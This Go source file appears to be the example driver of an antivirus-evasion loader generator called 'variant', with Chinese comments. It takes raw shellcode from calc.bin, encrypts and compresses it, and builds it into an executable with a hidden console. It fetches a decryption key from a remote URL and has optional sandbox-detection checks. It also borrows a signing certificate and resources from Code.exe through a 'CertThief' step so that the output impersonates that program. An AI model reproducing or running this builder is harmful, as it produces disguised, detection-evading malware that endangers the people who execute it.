package main

import (
	"variant/compilers"
	"variant/crypto"
	"variant/gores"
	"variant/log"
	"variant/payloads"
	"variant/remote"
	"variant/templates"
	"variant/xrand"
)

func main() {

	// 1. 构建 Payload, 构建 BaseCtx
	base, _ := templates.NewBaseCtxBuilder().
		SetRemote(func(r *templates.RemoteCtx) {
			r.Import = "variant/remote"
			r.Function = "remote.HttpGetString"
			r.Url = "http://127.0.0.1:8080/"
		}).
		SetHash(templates.NewHashCtx(
			"remote.SHA256Hash",
			remote.RandomICONUrl(),
			templates.Interval(0, 16),
			templates.Interval(0, 16)),
		).
		SetCrypto(func(c *templates.CryptoCtx) {
			c.Import = "variant/crypto"
			c.Encrypt = crypto.AesBase32Encrypt
			c.Decrypt = "crypto.AesBase32Decrypt"
		}).
		SetCompress(templates.NewCompressCtx("compress.LzwDecompress", 8)).
		SetAutoPayload(func(p *payloads.PayloadCtx) {
			p.Raw = "output/calc.bin"
			p.SavePath = "output"
			p.CipherText = xrand.N(8)
			p.PlainText = xrand.N(8)
		}).
		//SetSandbox(templates.NewSandboxCtx([]string{"sandbox.BootTime", "sandbox.GetDesktopFiles"})).
		SetLoader(templates.NewLoaderCtx("loader.Direct")).
		Build()

	err := base.Payload.Save("bin")
	if err != nil {
		return
	}

	// 2. 构建 TmplCtx 中的任意加载方式，例如：LocalCtx
	tmpl := templates.NewTmplBuilder().
		SetDynamic(base, func(d *templates.DynamicCtx) {
			d.KeyVar = xrand.N(3)
			d.IVVar = xrand.N(3)
			d.Payload = base.Payload.Encryption
		}).
		// 不使用动态密钥（base.Remote 和 base.Hash 为 nil），直接将 base.Crypto 的 Key 和 IV
		// 启用动态密钥的条件： if b.base.Remote != nil && b.base.Hash != nil
		//SetDynamic(base, func(d *templates.DynamicCtx) {
		//	d.KeyVar = xrand.N(3)
		//	d.KeyValue = string(base.Crypto.Key)
		//	d.IVVar = xrand.N(3)
		//	d.IVValue = string(base.Crypto.IV)
		//	d.Payload = base.Payload.Encryption
		//}).
		Render()

	goCodeFile, err := tmpl.TmplRender()
	if err != nil {
		log.Fatal(err)
	}

	// 将 path/name.go 转换为 name.exe
	exeFileName := compilers.RenameGoTrimSuffix(goCodeFile)
	// 将 name.exe 转换为 signed_name.exe
	signedPEName := compilers.RenameSignedPEName(exeFileName)

	// 3. 编译
	cb, _ := compilers.NewCompileBuilder().
		SetBuildCtx(func(b *compilers.BuildCtx) {
			b.SrcGoFile = goCodeFile
			b.BuildMode = "pie"
			b.OutExeFile = exeFileName
			b.WorkingDir = "output"
			b.HideConsole = true
			//b.Obfuscate = true
			//b.Seed = true
			//b.Tiny = true
		}).
		SetResCtx(func(r *gores.GoWinRes) {
			r.PatchFile = exeFileName
			r.PatchDir = "output"
			r.ExtractFile = "Code.exe"
		}).
		SetSignCtx(func(s *compilers.CertThief) {
			s.SrcFile = exeFileName
			s.SignedPE = signedPEName
			s.WorkingDir = "output"
			s.Target = "Code.exe"
			s.CertFile = "Code.cer"
		}).
		SetUpxCtx(func(u *compilers.UpxCtx) {
			u.Keep = true
			u.WorkingDir = "output"
			u.Level = "--lzma"
			u.SrcExe = signedPEName
			u.UpxPath = "output"
		}).
		Build()

	errCp := cb.Build.Compile()
	if errCp != nil {
		panic(errCp)
	}

	//errRes := cb.Res.Extract()
	//if errRes != nil {
	//	panic(errRes)
	//}
	//
	//errSign := cb.Sign.SignExecutable()
	//if errSign != nil {
	//	panic(errSign)
	//}
	//
	//errSave := cb.Sign.SaveCertificate()
	//if errSave != nil {
	//	panic(errSave)
	//}
	//
	//errUpx := cb.Upx.Pack()
	//if errUpx != nil {
	//	panic(errUpx)
	//}
}
